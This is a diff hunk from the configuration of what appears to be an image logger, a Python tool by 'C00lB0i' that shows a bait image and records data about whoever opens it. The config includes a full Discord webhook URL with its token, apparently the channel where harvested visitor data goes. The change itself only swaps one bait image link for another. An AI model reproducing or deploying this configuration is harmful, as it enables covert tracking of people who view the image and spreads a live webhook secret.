@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1335481750431862806/GK566eyy_2Ws6Uw0hOpovm7YPP0X917ItH_ivyTHg6lwGxN44TGcKRYbbxeM0AKN-A_c",
-    "image": "https://w0.peakpx.com/wallpaper/644/472/HD-wallpaper-dont-open-my-phone-funny-weird-stop-you-saying.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/77/6e/96/776e9698bcca34d24ba4b482d1e8c1f4.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
